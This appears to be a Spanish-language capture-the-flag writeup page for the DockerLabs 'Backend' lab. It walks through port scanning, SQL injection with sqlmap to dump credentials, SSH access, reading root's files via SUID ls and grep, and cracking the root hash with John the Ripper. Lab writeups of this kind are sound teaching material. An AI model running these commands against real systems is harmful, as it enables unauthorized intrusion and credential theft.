@@ -1,0 +1,232 @@
+---
+title: Backend
+description: Resolución completa de la máquina virtual *Backend* de DockerLabs, incluyendo reconocimiento, explotación y escalada de privilegios.
+---
+
+import InfoTable from 'src/components/InfoTable.astro';
+import VulnTable from 'src/components/VulnTable.astro';
+
+## Introducción
+
+Este documento presenta la resolución completa de la máquina **Backend**, desarrollada por *4bytes* para la plataforma **DockerLabs**, clasificada con una dificultad **Fácil**.
+El laboratorio expone un servidor web con un formulario de login vulnerable a **SQL Injection**, permitiendo la extracción de credenciales de la base de datos. Con estas credenciales, se accede al sistema vía SSH como el usuario `pepe`.
+Una vez dentro, se identifican binarios con permisos SUID, incluyendo `ls` y `grep`, que permiten listar y leer archivos sensibles del sistema. Se encuentra un hash en `/root/root.txt` que, tras ser crackeado con John the Ripper, revela la contraseña del usuario `root`, otorgando acceso completo al sistema.
+Todo el proceso se llevó a cabo dentro de un entorno controlado con fines estrictamente educativos.
+
+---
+
+## Información Técnica
+
+<InfoTable
+  title=""
+  data={{
+    Nombre: 'Backend',
+    Autor: '4bytes',
+    Dificultad: 'Fácil',
+    Fecha: '29/08/2024',
+    Plataforma: 'DockerLabs',
+    'IP Objetivo': '172.17.0.2'
+  }}
+/>
+
+---
+
+## Paso 0 — Despliegue y preparación
+
+Se descomprime la máquina y se despliega utilizando el script proporcionado:
+
+```bash
+unzip Backend.zip
+sudo bash auto_deploy.sh Backend.tar
+```
+
+Una vez iniciado el contenedor, se asigna la dirección IP correspondiente.
+
+![IP asignada](https://res.cloudinary.com/dewqswzke/image/upload/v1748411786/ipScan_skcisu.png)
+
+Se organiza el entorno de trabajo para mantener una estructura clara durante el análisis:
+
+```bash
+mkdir -p Backend/{content,exploits,nmap,scripts}
+cd Backend
+```
+
+---
+
+## Paso 1 — Reconocimiento
+
+### 1.1 Escaneo de puertos
+
+Se realiza un escaneo completo de puertos TCP para identificar servicios expuestos:
+
+```bash
+nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG allPorts
+extractPorts allPorts
+```
+
+El resultado muestra los siguientes servicios accesibles externamente:
+
+* **22/tcp** — SSH
+* **80/tcp** — HTTP
+
+![Puertos abiertos](https://res.cloudinary.com/dewqswzke/image/upload/v1754972666/Ports_tb2oio.png)
+
+---
+
+### 1.2 Enumeración de servicios
+
+Se realiza un escaneo detallado de los servicios identificados:
+
+```bash
+nmap -sCV -p22,80 172.17.0.2 -oN targeted
+```
+
+---
+
+### 1.3 Enumeración web
+
+Se realiza un escaneo de directorios para encontrar posibles endpoints en el servicio del puerto 80:
+
+```bash
+gobuster dir -u http://172.17.0.2/ \
+  -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt \
+  -x php,html,txt,js -t 200
+```
+
+Se detectan las siguientes rutas:
+
+* **Index:** Página principal en desarrollo.
+  ![Index](https://res.cloudinary.com/dewqswzke/image/upload/v1754972668/Index_m0eqgz.png)
+
+* **Login:** Formulario de autenticación de usuarios.
+  ![Login](https://res.cloudinary.com/dewqswzke/image/upload/v1754972668/Login_wea7yr.png)
+
+---
+
+## Paso 2 — Explotación (Acceso inicial)
+
+### 2.1 Confirmación de SQL Injection
+
+La ruta `/login.html` parece vulnerable a **SQL Injection**. En el campo de usuario se introduce un valor arbitrario seguido de una comilla simple (`'`) para provocar un error y confirmar la vulnerabilidad.
+
+![SQLi](https://res.cloudinary.com/dewqswzke/image/upload/v1754972666/Sqli_bijr0w.png)
+
+### 2.2 Extracción de datos con SQLMap
+
+Una vez confirmada la inyección SQL, se utiliza `sqlmap` para extraer la información de la base de datos:
+
+```bash
+sqlmap -u http://172.17.0.2/login.html --forms --batch --dbs
+```
+
+![Databases](https://res.cloudinary.com/dewqswzke/image/upload/v1754972667/Databases_uazbs5.png)
+
+Se listan las tablas y se vuelca el contenido de la tabla `usuarios`:
+
+```bash
+sqlmap -u "http://172.17.0.2/login.html" --forms --batch -D users -T usuarios --dump
+```
+
+Se obtienen credenciales que se prueban vía SSH. El único usuario válido es **pepe**.
+
+### 2.3 Acceso SSH
+
+Se accede al sistema:
+
+```bash
+ssh pepe@172.17.0.2
+```
+
+![SSH Access](https://res.cloudinary.com/dewqswzke/image/upload/v1754972669/Pepe_pzcuen.png)
+
+---
+
+## Paso 3 — Escalada de privilegios
+
+### 3.1 De pepe → root
+
+Se verifican los permisos sudo:
+
+```bash
+sudo -l
+```
+
+El usuario no tiene permisos sudo. Se buscan binarios con permisos SUID:
+
+```bash
+find / -perm -4000 2>/dev/null
+```
+
+![SUID](https://res.cloudinary.com/dewqswzke/image/upload/v1754972667/Find_mrg0ys.png)
+
+Entre los binarios detectados, destacan `ls` y `grep`. Se usa `ls` para listar el directorio `/root`:
+
+```bash
+/bin/ls -la /root
+```
+
+![Ls](https://res.cloudinary.com/dewqswzke/image/upload/v1754976741/Ls_yytifz.png)
+
+Con `grep` se lee el contenido del archivo sensible y se obtiene un hash:
+
+```bash
+/bin/grep -r "" /root/root.txt
+```
+
+![Grep](https://res.cloudinary.com/dewqswzke/image/upload/v1754972667/Grep_b9rq3j.png)
+
+### 3.2 Crackeo del hash
+
+Se utiliza **John the Ripper** para crackear el hash:
+
+```bash
+echo "hash" > hash.txt
+john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
+```
+
+![John](https://res.cloudinary.com/dewqswzke/image/upload/v1754972668/John_i0yge5.png)
+
+El hash revela la contraseña del usuario root. Se inicia sesión como administrador:
+
+```bash
+su root
+```
+
+![Root](https://res.cloudinary.com/dewqswzke/image/upload/v1754972666/Root_suqna0.png)
+
+---
+
+## Análisis de Vulnerabilidades
+
+### Fallos de Seguridad Identificados
+
+<VulnTable
+  title=""
+  data={[
+    {
+      vulnerability: "SQL Injection en formulario de login",
+      severity: "Crítica",
+      impact: "Extracción de credenciales de la base de datos"
+    },
+    {
+      vulnerability: "Almacenamiento de contraseñas en texto plano o hashes débiles",
+      severity: "Alta",
+      impact: "Compromiso de cuentas de usuario"
+    },
+    {
+      vulnerability: "Binarios con permisos SUID innecesarios (ls y grep)",
+      severity: "Alta",
+      impact: "Exposición de archivos sensibles del sistema"
+    },
+    {
+      vulnerability: "Contraseña débil para usuario root",
+      severity: "Crítica",
+      impact: "Acceso no autorizado al sistema"
+    },
+    {
+      vulnerability: "Falta de validación de entradas en el formulario web",
+      severity: "Alta",
+      impact: "Múltiples vectores de inyección"
+    }
+  ]}
+/>
